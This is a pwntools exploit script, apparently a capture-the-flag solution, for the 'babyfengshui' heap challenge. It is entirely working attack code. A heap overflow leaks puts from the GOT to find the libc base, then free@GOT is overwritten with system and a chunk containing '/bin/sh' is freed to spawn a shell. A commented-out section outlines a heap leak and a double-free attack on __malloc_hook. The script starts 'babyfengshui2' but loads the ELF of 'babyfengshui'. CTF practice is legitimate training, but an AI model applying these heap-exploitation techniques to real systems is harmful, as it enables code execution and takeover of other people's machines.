from pwn import *

def packAll(rop):
    return flat([p32(x) for x in rop])

r = process('babyfengshui2')
e = ELF('babyfengshui')

def Add(d_size, name, text):
    t_size = len(text)
    r.sendlineafter('Action: ', '0')
    r.sendlineafter('size of description: ', str(d_size))
    r.sendlineafter('name: ', name)
    r.sendlineafter('text length: ', str(t_size))
    r.sendlineafter('text: ', text)

def Delete(index):
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('index: ', str(index))

def Show(index):
    r.sendlineafter('Action: ', '2')
    r.sendlineafter('index: ', str(index))

def Update(index, text):
    r.sendlineafter('Action: ', '3')
    r.sendlineafter('index: ', str(index))
    r.sendlineafter('text length: ', str(len(text)))
    r.sendlineafter('text: ', text)


# leak libc
Add(8, 'D'*4, 'D'*7)
Add(8, 'D'*4, 'D'*7)
Delete(0)
Add(0x60, 'C'*4, 'C'*152+p32(e.got['puts']))
Show(1)
puts = u32(r.recv(24)[20:24])
## got libc
libc = e.libc
libc_base = puts - libc.symbols['puts']
log.info('libc base: 0x%x' % libc_base)
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook: 0x%x' % (__malloc_hook))

system = libc_base + libc.symbols['system']
Add(0x30, 'D'*4, 'D'*7)
Add(0x30, 'D'*4, 'D'*7)
Delete(3)
Add(0x50, 'C'*4, '/bin/sh\x00'+'C'*(192-0x8)+p32(e.got['free']))
Update(4, p32(system))
Delete(5)
r.interactive()
## leak heap base
#Add(0x30, 'D'*4, 'D'*7)
#Add(0x30, 'D'*4, 'D'*7)
#Delete(3)
#Add(0x50, 'C'*4, 'C'*192+p32(__malloc_hook+0x20+1))
#Show(4)
#heap_base = u32('\x00'+r.recv(23)[-3:])
#log.info('heap base: 0x%x' % heap_base)
#
## double free
#Add(0x70, 'D'*4, 'D'*7) # padding
#Add(0x70, 'D'*4, 'D'*7)
#Add(0x70, 'D'*4, 'D'*7)
#Add(0x70, 'D'*4, 'D'*7)
#Delete(7)
#fbin = __malloc_hook + 0x100 - 0x48
#Add(0x80, 'C'*4, 'C'*128+packAll([0, 0x79, fbin, fbin])+'C'*(240-128-0x10)+packAll([0,0,0x78,0x78])+'C'*(376-240-0x10-0x10)+packAll([0,0,0,0x89])+p32(heap_base+0x4c8))
#Delete(10)
#Delete(9)
#Delete(10)
#r.interactive()





